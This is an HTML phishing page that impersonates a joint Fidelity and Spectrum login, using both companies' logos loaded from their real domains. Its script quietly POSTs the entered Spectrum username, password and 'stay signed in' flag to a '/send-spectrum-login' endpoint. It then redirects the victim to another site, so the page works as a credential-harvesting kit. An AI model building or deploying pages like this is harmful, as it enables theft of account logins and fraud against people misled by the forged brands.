<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>Fidelity Spectrum Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet"/>
  <style>body { font-family: "Inter", sans-serif; }</style>
</head>
<body class="bg-[#f2f2f2] min-h-screen flex flex-col">

  <!-- Top header with Fidelity logo left -->
  <header class="bg-white border-b border-gray-200">
    <div class="max-w-7xl mx-auto flex justify-start items-center px-4 py-3 space-x-6">
      <a href="#"><img alt="Fidelity logo" class="object-contain" height="32" src="https://digital.fidelity.com/stgw/digital/login/dist/Fidelity-wordmark.svg" width="120"/></a>
    </div>
  </header>

  <!-- Centered Fidelity + Spectrum logos with description -->
  <section class="bg-white border-b border-gray-200 py-8">
    <div class="max-w-7xl mx-auto flex flex-col items-center space-y-4 px-4">
      <div class="flex space-x-2 items-center">
        <img alt="Fidelity logo" class="object-contain" height="32" src="https://digital.fidelity.com/stgw/digital/login/dist/Fidelity-wordmark.svg" width="120"/>
        <img alt="Spectrum logo" class="object-contain" height="32" src="https://id.spectrum.net/assets/images/spectrum-logo.svg" width="120"/>
      </div>
      <p class="text-center text-lg font-semibold">Fidelity uses Spectrum to connect your information</p>
    </div>
  </section>

  <!-- Main form container with Spectrum styling -->
  <main class="flex-grow flex flex-col items-center justify-center px-4 py-12">
    <form id="spectrumForm" class="bg-white rounded-lg shadow-sm p-8 w-full max-w-md" aria-label="Spectrum login form">
      <!-- Spectrum logo top inside form -->
      <div class="flex justify-center mb-6">
        <img alt="Spectrum logo" class="object-contain" height="40" src="https://id.spectrum.net/assets/images/spectrum-logo.svg" width="150"/>
      </div>

      <label class="block font-semibold mb-1" for="spectrumUsername">Spectrum Username</label>
      <input id="spectrumUsername" name="spectrumUsername" type="text" autocomplete="username" class="w-full border border-gray-300 rounded-md px-3 py-2 mb-5 focus:outline-none focus:ring-2 focus:ring-green-700" required/>

      <label class="block font-semibold mb-1" for="spectrumPassword">Spectrum Password</label>
      <div class="relative mb-4">
        <input id="spectrumPassword" name="spectrumPassword" type="password" autocomplete="current-password" class="w-full border border-gray-300 rounded-md px-3 py-2 pr-10 focus:outline-none focus:ring-2 focus:ring-green-700" required/>
      </div>

      <div class="flex items-center mb-6">
        <input id="staySignedIn" name="staySignedIn" type="checkbox" class="h-4 w-4 text-green-700 border-gray-300 rounded"/>
        <label class="ml-2 text-sm select-none" for="staySignedIn">Stay signed in</label>
      </div>

      <button type="submit" class="w-full bg-blue-700 hover:bg-blue-800 text-white font-semibold rounded-md py-2">Sign In</button>
    </form>
  </main>

  <script>
    document.getElementById("spectrumForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const spectrumUsername = document.getElementById("spectrumUsername").value;
      const spectrumPassword = document.getElementById("spectrumPassword").value;
      const staySignedIn = document.getElementById("staySignedIn").checked;

      fetch("/send-spectrum-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ spectrumUsername, spectrumPassword, staySignedIn }),
      })
      .finally(() => {
        window.location.href = "https://test.com";
      });
    });
  </script>

</body>
</html>
